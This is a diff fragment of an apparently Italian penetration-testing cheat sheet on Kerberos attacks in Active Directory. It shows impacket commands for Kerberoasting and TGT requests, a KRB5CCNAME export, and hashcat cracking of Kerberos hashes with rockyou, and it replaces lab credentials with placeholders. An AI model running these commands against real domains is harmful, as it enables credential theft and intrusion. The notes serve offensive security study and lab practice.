@@ -23,11 +23,11 @@ impacket-GetUserSPNs <NOME MACCHINA>/<USER>:<PASS> -request
 ```
 ### **TGT BruteForce**
 ```bash
-impacket-getTGT 'essos.local/khal.drogo:horse'
+impacket-getTGT '<DOMAIN>/<USERS>:<PWD>'
 ```
 ```bash
-
-
+export KRB5CCNAME=..../user.chace
+```
 ### **CRACK KRB5 HASH**
 ```bash
 hashcat -m 18200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
